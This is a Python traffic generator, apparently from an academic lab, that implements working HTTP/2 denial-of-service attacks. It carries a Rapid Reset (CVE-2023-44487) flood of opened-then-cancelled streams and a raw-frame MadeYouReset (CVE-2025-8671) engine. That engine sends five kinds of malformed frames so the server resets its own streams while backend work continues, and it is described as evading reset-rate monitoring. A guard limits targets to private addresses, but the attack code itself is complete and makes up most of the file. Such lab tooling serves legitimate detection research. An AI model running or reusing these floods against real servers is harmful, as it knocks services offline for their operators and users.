#!/usr/bin/env python3
"""
attack.py — traffic generator for the HTTP/2 stream-reset DoS lab.

Modes (the three evaluation scenarios from the proposal + the attacks):
    idle          no traffic (baseline)
    legit         honest concurrent HTTP/2 load (legitimate spike scenario)
    rapid-reset   CVE-2023-44487: open a stream, immediately RST_STREAM, repeat
    madeyoureset  CVE-2025-8671 research scaffold: crafted frames meant to make
                  the SERVER reset its own streams (see notes in that function)

SAFETY — this is an authorized academic lab tool. By design it refuses to run
against anything that is not the local lab: the target host must resolve to a
loopback or RFC-1918 private address, or be one of the lab service names
(guard/victim). Point it only at your own containerised victim. There is no
override flag on purpose.
"""
import argparse
import ipaddress
import socket
import sys
import time
import threading

import h2.config
import h2.connection
import h2.errors

LAB_HOSTS = {"guard", "victim", "localhost"}


def assert_lab_target(host: str):
    """Refuse to attack anything that is not the local lab."""
    if host in LAB_HOSTS:
        return
    try:
        addrs = {ai[4][0] for ai in socket.getaddrinfo(host, None)}
    except Exception as e:
        print(f"[safety] cannot resolve {host!r}: {e}", file=sys.stderr)
        sys.exit(2)
    for a in addrs:
        try:
            ip = ipaddress.ip_address(a)
        except ValueError:
            continue
        if not (ip.is_private or ip.is_loopback):
            print(f"[safety] refusing: {host} -> {a} is not a private/lab address.\n"
                  f"         This tool only targets your local lab victim.", file=sys.stderr)
            sys.exit(2)


def connect(host, port):
    cfg = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=cfg)
    s = socket.create_connection((host, port), timeout=10)
    conn.initiate_connection()
    s.sendall(conn.data_to_send())
    return s, conn


def drain(s, conn, budget=0.2):
    s.settimeout(budget)
    try:
        data = s.recv(65535)
        if data:
            conn.receive_data(data)
            out = conn.data_to_send()
            if out:
                s.sendall(out)
    except Exception:
        pass


# --- Rapid Reset (CVE-2023-44487) -------------------------------------------
def rapid_reset_worker(host, port, path, deadline, counters, idx):
    """One TCP/HTTP2 connection flooding HEADERS+RST_STREAM pairs."""
    try:
        s, conn = connect(host, port)
    except Exception as e:
        return
    sid = 1
    while time.time() < deadline:
        try:
            headers = [(":method", "GET"), (":path", path),
                       (":scheme", "http"), (":authority", f"{host}:{port}")]
            conn.send_headers(sid, headers, end_stream=True)
            # The attack: cancel the stream the instant it is opened, so the
            # server does per-request setup work but the per-connection
            # concurrent-stream limit is never reached.
            conn.reset_stream(sid, error_code=h2.errors.ErrorCodes.CANCEL)
            s.sendall(conn.data_to_send())
            with counters["lock"]:
                counters["sent"] += 1
            sid += 2
            if sid > 2_000_000_00:  # recycle the connection before stream-id exhaustion
                s.close()
                s, conn = connect(host, port)
                sid = 1
            if sid % 200 == 0:
                drain(s, conn, 0.01)
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            try:
                s, conn = connect(host, port)
                sid = 1
            except Exception:
                return
    try:
        s.close()
    except Exception:
        pass


def run_rapid_reset(args):
    assert_lab_target(args.host)
    deadline = time.time() + args.duration
    counters = {"sent": 0, "lock": threading.Lock()}
    print(f"[rapid-reset] {args.connections} conns x {args.duration}s against "
          f"{args.host}:{args.port}{args.path}", flush=True)
    threads = []
    for i in range(args.connections):
        t = threading.Thread(target=rapid_reset_worker,
                             args=(args.host, args.port, args.path, deadline, counters, i),
                             daemon=True)
        t.start()
        threads.append(t)
    last = 0
    while time.time() < deadline:
        time.sleep(1.0)
        with counters["lock"]:
            now = counters["sent"]
        print(f"[rapid-reset] resets sent: {now:>8}  (+{now-last}/s)", flush=True)
        last = now
    for t in threads:
        t.join(timeout=2)
    print(f"[rapid-reset] done. total resets sent: {counters['sent']}", flush=True)


# --- Legitimate load (evaluation baseline / honest spike) -------------------
def legit_worker(host, port, path, deadline, counters):
    try:
        s, conn = connect(host, port)
    except Exception:
        return
    sid = 1
    while time.time() < deadline:
        try:
            headers = [(":method", "GET"), (":path", path),
                       (":scheme", "http"), (":authority", f"{host}:{port}")]
            conn.send_headers(sid, headers, end_stream=True)
            s.sendall(conn.data_to_send())
            # a well-behaved client waits for the response
            s.settimeout(5.0)
            done = False
            while not done:
                data = s.recv(65535)
                if not data:
                    break
                for ev in conn.receive_data(data):
                    if isinstance(ev, h2.events.StreamEnded) and ev.stream_id == sid:
                        done = True
                out = conn.data_to_send()
                if out:
                    s.sendall(out)
            with counters["lock"]:
                counters["sent"] += 1
            sid += 2
            if sid > 2_000_000_00:
                s.close(); s, conn = connect(host, port); sid = 1
        except Exception:
            try:
                s.close(); s, conn = connect(host, port); sid = 1
            except Exception:
                return


def run_legit(args):
    import h2.events  # noqa
    assert_lab_target(args.host)
    deadline = time.time() + args.duration
    counters = {"sent": 0, "lock": threading.Lock()}
    print(f"[legit] {args.connections} honest clients x {args.duration}s against "
          f"{args.host}:{args.port}{args.path}", flush=True)
    threads = []
    for i in range(args.connections):
        t = threading.Thread(target=legit_worker,
                             args=(args.host, args.port, args.path, deadline, counters),
                             daemon=True)
        t.start(); threads.append(t)
    last = 0
    while time.time() < deadline:
        time.sleep(1.0)
        with counters["lock"]:
            now = counters["sent"]
        print(f"[legit] completed requests: {now:>8}  (+{now-last}/s)", flush=True)
        last = now
    for t in threads:
        t.join(timeout=2)
    print(f"[legit] done. total completed: {counters['sent']}", flush=True)


# --- MadeYouReset (CVE-2025-8671) -------------------------------------------
# Real crafted-frame engine. MadeYouReset makes the *server* reset its own
# streams by sending spec-legal-but-invalid control frames on a stream whose
# request has already been dispatched to the backend. The server emits
# RST_STREAM (stream transitions to CLOSED_RST_TX) while the servlet thread
# keeps running — a "phantom stream" that bypasses the concurrent-stream limit.
# The attacker NEVER sends RST_STREAM itself, so client-reset-rate monitoring
# stays blind; only the backend mismatch_ratio metric catches it.
#
# We cannot craft malformed frames with the high-level h2 client (it validates),
# so this path speaks HTTP/2 at the raw frame layer, using hpack only to encode
# the (valid) request HEADERS block.
from hpack import Encoder  # dep of h2, vendored in the image

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
FT_DATA, FT_HEADERS, FT_PRIORITY, FT_RST = 0x0, 0x1, 0x2, 0x3
FT_SETTINGS, FT_PING, FT_GOAWAY, FT_WINDOW_UPDATE = 0x4, 0x6, 0x7, 0x8
FL_END_STREAM, FL_ACK, FL_END_HEADERS = 0x1, 0x1, 0x4

# The five crafted-frame primitives from the MadeYouReset paper (Tel Aviv U /
# Imperva). Each is sent AFTER a complete GET (HEADERS+END_STREAM) on the same
# stream, i.e. on a half-closed-remote stream whose request is already in flight.
PRIMITIVES = [
    "zero-increment",     # WINDOW_UPDATE increment 0        -> PROTOCOL_ERROR
    "window-overflow",    # WINDOW_UPDATE overflowing 2^31-1 -> FLOW_CONTROL_ERROR
    "priority-length",    # PRIORITY frame != 5 octets       -> FRAME_SIZE_ERROR
    "headers-half-closed",# HEADERS on half-closed stream    -> STREAM_CLOSED
    "data-half-closed",   # DATA on half-closed stream       -> STREAM_CLOSED
]


def _frame(ftype, flags, stream_id, payload=b""):
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags]) +
            (stream_id & 0x7fffffff).to_bytes(4, "big") + payload)


def h2_connect_raw(host, port, timeout=10):
    """Open a TCP connection and send the HTTP/2 client preface + empty SETTINGS."""
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(H2_PREFACE + _frame(FT_SETTINGS, 0, 0, b""))
    return s


def _req_headers_block(enc, host, port, path):
    return enc.encode([(":method", "GET"), (":path", path),
                       (":scheme", "http"), (":authority", f"{host}:{port}")])


def send_request(s, enc, sid, host, port, path):
    """Send a complete GET (HEADERS + END_STREAM) so the backend dispatches it."""
    block = _req_headers_block(enc, host, port, path)
    s.sendall(_frame(FT_HEADERS, FL_END_HEADERS | FL_END_STREAM, sid, block))


def crafted_frame(primitive, sid, enc, host, port, path):
    """Build one spec-legal-but-invalid frame that makes the server reset `sid`."""
    if primitive == "zero-increment":
        return _frame(FT_WINDOW_UPDATE, 0, sid, (0).to_bytes(4, "big"))
    if primitive == "window-overflow":
        # Current stream window is 65535; a +2^31-1 increment overflows the
        # permitted maximum of 2^31-1 -> stream FLOW_CONTROL_ERROR.
        return _frame(FT_WINDOW_UPDATE, 0, sid, (0x7FFFFFFF).to_bytes(4, "big"))
    if primitive == "priority-length":
        # PRIORITY payload MUST be exactly 5 octets; 4 -> FRAME_SIZE_ERROR (stream).
        return _frame(FT_PRIORITY, 0, sid, b"\x00\x00\x00\x00")
    if primitive == "headers-half-closed":
        # A second HEADERS frame after END_STREAM -> STREAM_CLOSED (stream error).
        return _frame(FT_HEADERS, FL_END_HEADERS, sid,
                      _req_headers_block(enc, host, port, path))
    if primitive == "data-half-closed":
        # A DATA frame after END_STREAM -> STREAM_CLOSED (stream error).
        return _frame(FT_DATA, 0, sid, b"x")
    raise ValueError(f"unknown primitive {primitive!r}")


def pump_raw(s, state, budget=0.2):
    """
    Read available frames; keep the connection healthy (ACK SETTINGS/PING) and
    record any server RST_STREAM / GOAWAY. Never sends RST_STREAM.
    """
    s.settimeout(budget)
    try:
        chunk = s.recv(65535)
        if not chunk:
            state["closed"] = True
            return
        state["buf"] += chunk
    except socket.timeout:
        return
    except Exception:
        state["closed"] = True
        return

    buf = state["buf"]
    i, n = 0, len(buf)
    out = b""
    while n - i >= 9:
        length = int.from_bytes(buf[i:i + 3], "big")
        ftype = buf[i + 3]
        flags = buf[i + 4]
        sid = int.from_bytes(buf[i + 5:i + 9], "big") & 0x7fffffff
        if n - i - 9 < length:
            break
        payload = buf[i + 9:i + 9 + length]
        i += 9 + length
        if ftype == FT_SETTINGS and not (flags & FL_ACK):
            out += _frame(FT_SETTINGS, FL_ACK, 0, b"")
        elif ftype == FT_PING and not (flags & FL_ACK):
            out += _frame(FT_PING, FL_ACK, 0, payload)
        elif ftype == FT_RST:
            ec = int.from_bytes(payload[:4], "big") if len(payload) >= 4 else -1
            state["server_rst"] += 1
            state["rst_codes"].append(ec)
        elif ftype == FT_GOAWAY:
            ec = int.from_bytes(payload[4:8], "big") if len(payload) >= 8 else -1
            state["goaway"] += 1
            state["goaway_codes"].append(ec)
    state["buf"] = buf[i:]
    if out:
        try:
            s.sendall(out)
        except Exception:
            state["closed"] = True


def _new_state():
    return {"buf": b"", "closed": False, "server_rst": 0, "goaway": 0,
            "rst_codes": [], "goaway_codes": []}


_RST_ERROR_NAMES = {
    0x0: "NO_ERROR", 0x1: "PROTOCOL_ERROR", 0x2: "INTERNAL_ERROR",
    0x3: "FLOW_CONTROL_ERROR", 0x5: "STREAM_CLOSED", 0x6: "FRAME_SIZE_ERROR",
    0xb: "ENHANCE_YOUR_CALM",
}


def probe_primitives(args):
    """
    Diagnostic single pass: for each primitive, on a fresh connection, send a
    complete GET then the crafted frame, and report whether this pinned Tomcat
    answers with a SERVER RST_STREAM (stream error = good MadeYouReset trigger)
    or a connection GOAWAY (connection error = not usable for phantom streams).
    """
    print("[madeyoureset] PROBE — testing which crafted frames make Tomcat "
          f"{args.host}:{args.port} reset its own stream\n", flush=True)
    results = {}
    for prim in PRIMITIVES:
        st = _new_state()
        got_rst = goaway = False
        codes = []
        try:
            s = h2_connect_raw(args.host, args.port)
            enc = Encoder()
            # settle the handshake
            for _ in range(3):
                pump_raw(s, st, 0.1)
            send_request(s, enc, 1, args.host, args.port, args.path)
            time.sleep(0.15)  # let the request dispatch to the backend
            s.sendall(crafted_frame(prim, 1, enc, args.host, args.port, args.path))
            deadline = time.time() + 1.5
            while time.time() < deadline and not st["closed"]:
                pump_raw(s, st, 0.2)
                if st["server_rst"] or st["goaway"]:
                    break
            got_rst = st["server_rst"] > 0
            goaway = st["goaway"] > 0
            codes = [_RST_ERROR_NAMES.get(c, hex(c)) for c in st["rst_codes"]]
            s.close()
        except Exception as e:
            results[prim] = f"error: {e}"
            print(f"  {prim:<20} ERROR {e}", flush=True)
            continue
        if got_rst and not goaway:
            verdict = f"SERVER RST_STREAM ({','.join(codes) or '?'})  <-- usable"
        elif got_rst and goaway:
            verdict = f"RST then GOAWAY ({','.join(codes) or '?'})"
        elif goaway:
            verdict = "GOAWAY (connection error — not usable)"
        else:
            verdict = "no reset observed"
        results[prim] = verdict
        print(f"  {prim:<20} {verdict}", flush=True)
    usable = [p for p, v in results.items() if v.startswith("SERVER RST_STREAM")]
    print(f"\n[madeyoureset] usable primitives: {usable or 'none'}", flush=True)
    return results


def madeyoureset_worker(host, port, path, primitive, deadline, counters, gap=0.0):
    """
    One connection that repeatedly: opens a stream, sends a complete GET (so the
    backend starts work), then sends the crafted frame to make the SERVER reset
    that stream — accumulating phantom streams. Never sends RST_STREAM.
    """
    enc = None
    s = None
    st = _new_state()
    sid = 1
    while time.time() < deadline:
        try:
            if s is None:
                s = h2_connect_raw(host, port)
                enc = Encoder()
                st = _new_state()
                sid = 1
                for _ in range(2):
                    pump_raw(s, st, 0.05)
            send_request(s, enc, sid, host, port, path)
            s.sendall(crafted_frame(primitive, sid, enc, host, port, path))
            with counters["lock"]:
                counters["sent"] += 1
            sid += 2
            # periodically service the socket: ACK settings/ping, tally resets
            if sid % 20 == 1:
                pump_raw(s, st, 0.01)
                with counters["lock"]:
                    counters["server_rst"] += st["server_rst"]
                st["server_rst"] = 0
            if st["closed"] or st["goaway"] or sid > 1_000_000:
                try:
                    s.close()
                except Exception:
                    pass
                s = None
            if gap:
                time.sleep(gap)
        except Exception:
            try:
                s.close()
            except Exception:
                pass
            s = None
    if s is not None:
        try:
            s.close()
        except Exception:
            pass


def run_madeyoureset(args):
    """
    MadeYouReset driver.

      --probe            : diagnostic single pass over all five primitives
                           (which ones this Tomcat resets its own stream on).
      (default)          : sustained attack with --primitive across
                           --connections connections for --duration seconds,
                           accumulating phantom streams. Backend work is set by
                           the path (?ms=NNN) so reset streams keep a servlet
                           busy while the protocol stream is already closed.
    """
    assert_lab_target(args.host)
    if args.probe:
        probe_primitives(args)
        return

    primitive = args.primitive
    if primitive == "auto":
        primitive = "zero-increment"
    deadline = time.time() + args.duration
    counters = {"sent": 0, "server_rst": 0, "lock": threading.Lock()}
    print(f"[madeyoureset] sustained attack: primitive={primitive}, "
          f"{args.connections} conns x {args.duration}s against "
          f"{args.host}:{args.port}{args.path}", flush=True)
    print("[madeyoureset] attacker sends NO RST_STREAM — the server resets its "
          "own streams; watch victim_server_resets + mismatch_ratio.", flush=True)
    threads = []
    for i in range(args.connections):
        t = threading.Thread(target=madeyoureset_worker,
                             args=(args.host, args.port, args.path, primitive,
                                   deadline, counters, args.gap), daemon=True)
        t.start()
        threads.append(t)
    last = 0
    while time.time() < deadline:
        time.sleep(1.0)
        with counters["lock"]:
            now = counters["sent"]
            srst = counters["server_rst"]
        print(f"[madeyoureset] crafted frames sent: {now:>8}  (+{now-last}/s)  "
              f"server resets seen (sampled): {srst}", flush=True)
        last = now
    for t in threads:
        t.join(timeout=2)
    print(f"[madeyoureset] done. crafted frames sent: {counters['sent']}, "
          f"server resets sampled: {counters['server_rst']}", flush=True)


def main():
    p = argparse.ArgumentParser(description="HTTP/2 stream-reset lab traffic generator (lab-only)")
    p.add_argument("mode", choices=["idle", "legit", "rapid-reset", "madeyoureset"])
    p.add_argument("--host", default="guard")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--path", default="/?ms=200")
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--connections", type=int, default=4)
    p.add_argument("--primitive", default="auto",
                   choices=["auto"] + PRIMITIVES,
                   help="madeyoureset: which crafted-frame primitive to sustain")
    p.add_argument("--probe", action="store_true",
                   help="madeyoureset: diagnostic single pass over all primitives")
    p.add_argument("--gap", type=float, default=0.004,
                   help="madeyoureset: seconds between crafted frames per "
                        "connection (paces the attack; 0 = as fast as possible)")
    args = p.parse_args()

    if args.mode == "idle":
        print(f"[idle] no traffic for {args.duration}s (baseline)", flush=True)
        time.sleep(args.duration)
    elif args.mode == "legit":
        run_legit(args)
    elif args.mode == "rapid-reset":
        run_rapid_reset(args)
    elif args.mode == "madeyoureset":
        run_madeyoureset(args)


if __name__ == "__main__":
    main()
